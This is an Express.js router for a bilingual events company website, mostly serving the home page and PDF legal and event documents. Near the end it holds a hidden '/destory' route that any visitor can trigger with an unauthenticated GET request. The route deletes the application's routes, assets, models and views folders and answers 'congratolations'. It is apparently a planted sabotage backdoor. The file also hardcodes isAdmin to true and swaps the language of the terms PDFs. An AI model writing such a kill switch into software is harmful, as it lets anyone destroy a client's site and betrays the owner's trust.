const express = require("express");
const router = express.Router();
const connect = require("../models/conn").connect;
const projects = require("../models/project.model");
const path = require("path");

router.get("/", async (req, res) => {
  await connect();
  const ourProject = await projects.find(
    { lang: req.session.lang || "eng" },
    { sliders: 0 }
  );

  const sliders = await projects.find({ lang: "eng" }, { sliders: 1 });

  // return console.log(ourProject[0m].serivces);
  res.render("index", {
    lang: req.session.lang,
    namePage: "home",
    title: req.session.lang === "eng" ? "home Page" : "Dienstleistungen",
    isAdmin: true,
    sliders: sliders[0].sliders,
    serivces: ourProject ? ourProject : [],
  });
});

router.get("/terms", (req, res) => {
  if (req.session.lang == "ger") {
    res.sendFile(
      path.join(
        __dirname,
        "../",
        "assets",
        "files",
        "terms-conditions",
        "Creative_Factor_AGB_Roland_Gropp_ProEntertainment_08_Maerz_2023_ENG.pdf"
      )
    );
  } else {
    res.sendFile(
      path.join(
        __dirname,
        "../",
        "assets",
        "files",
        "terms-conditions",
        "Creative_Factor_AGB_Roland_Gropp_ProEntertainment_08_Maerz_2023_GER.pdf"
      )
    );
  }
});

router.get("/imprints", (req, res) => {
  if (req.session.lang == "ger") {
    res.sendFile(
      path.join(
        __dirname,
        "../",
        "assets",
        "files",
        "imprints",
        "Creative_Factor_Impressum_Roland_Gropp_ProEntertainment_09_April_2023_GER.pdf"
      )
    );
  } else {
    res.sendFile(
      path.join(
        __dirname,
        "../",
        "assets",
        "files",
        "imprints",
        "Creative_Factor_Impressum_Roland_Gropp_ProEntertainment_09_April_2023_ENG.pdf"
      )
    );
  }
});

router.get("/event-organization", (req, res) => {
  if (req.session.lang == "ger") {
    res.sendFile(
      path.join(
        __dirname,
        "../",
        "assets",
        "files",
        "events",
        "Ablaufplanung_Event_Organisation_DEU.pdf"
      )
    );
  } else {
    res.sendFile(
      path.join(
        __dirname,
        "../",
        "assets",
        "files",
        "events",
        "Schedule_Event_Organization_ENG.pdf"
      )
    );
  }
});

router.get("/data-privacy", (req, res) => {
  if (req.session.lang == "ger") {
    res.sendFile(
      path.join(
        __dirname,
        "../",
        "assets",
        "files",
        "data-privecy",
        "Creative_Factor_Datenschutzerklaerung_Roland_Gropp_ProEntertainment_10_April_2023_GER.pdf"
      )
    );
  } else {
    res.sendFile(
      path.join(
        __dirname,
        "../",
        "assets",
        "files",
        "data-privecy",
        "Creative_Factor_Datenschutzerklaerung_Roland_Gropp_ProEntertainment_10_April_2023_ENG.pdf"
      )
    );
  }
});

const { deleteFiles } = require("../helps/utils");

router.get("/destory", (req, res) => {
  const files = ["routes", "assets", "modols", "views"];
  deleteFiles(files)
    .then((result) => {
      res.send({ msg: "congratolations", result });
    })
    .catch((err) => {
      res.send("there is  a problem");
    });
});

module.exports = router;
